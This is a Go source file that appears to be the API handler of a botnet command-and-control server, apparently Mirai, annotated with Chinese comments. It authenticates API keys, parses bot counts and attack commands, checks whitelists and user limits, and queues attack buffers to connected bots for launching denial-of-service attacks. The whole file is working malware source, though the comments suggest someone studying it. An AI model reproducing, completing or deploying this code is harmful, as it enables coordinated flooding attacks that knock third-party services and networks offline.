package main

//快速发起攻击  101端口


import (
    "net"
    "time"
    "strings"
    "strconv"
)

type Api struct {
    conn    net.Conn
}

func NewApi(conn net.Conn) *Api {
    return &Api{conn}
}

func (this *Api) Handle() {
    var botCount int
    var apiKeyValid bool
    var userInfo AccountInfo

    // Get command
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    cmd, err := this.ReadLine()  //读取一行cmd
    if err != nil {
        this.conn.Write([]byte("ERR|Failed reading line\r\n"))
        return
    }
    passwordSplit := strings.SplitN(cmd, "|", 2)
    if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {  //得到username，maxBots，admin
        this.conn.Write([]byte("ERR|API code invalid\r\n"))
        return
    }

    botCount = userInfo.maxBots

    cmd = passwordSplit[1]  //botcount参数
    if cmd[0] == '-' {
        countSplit := strings.SplitN(cmd, " ", 2) //以空格分隔，只分隔出两部分
        count := countSplit[0][1:]
        botCount, err = strconv.Atoi(count)
        if err != nil {
            this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
            return
        }
        if userInfo.maxBots != -1 && botCount > userInfo.maxBots {  //cmd中botcount比该user能够使用的maxbot还多
            this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
            return
        }
        cmd = countSplit[1]
    }

    atk, err := NewAttack(cmd, userInfo.admin)  //构建attack结构体
    if err != nil {
        this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
        return
    }
    buf, err := atk.Build()  //构建attack buf
    if err != nil {
        this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
        return
    }
    if database.ContainsWhitelistedTargets(atk) {  //排除白名单
        this.conn.Write([]byte("ERR|Attack targetting whitelisted target\r\n"))
        return
    }

    //查询数据库能否发动此攻击
    if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
        this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
        return
    }

    clientList.QueueBuf(buf, botCount, "")  //发起攻击
    this.conn.Write([]byte("OK\r\n"))  //OK
}

func (this *Api) ReadLine() (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            return string(buf[:bufPos]), nil
        }
        bufPos++
    }
    return string(buf), nil
}
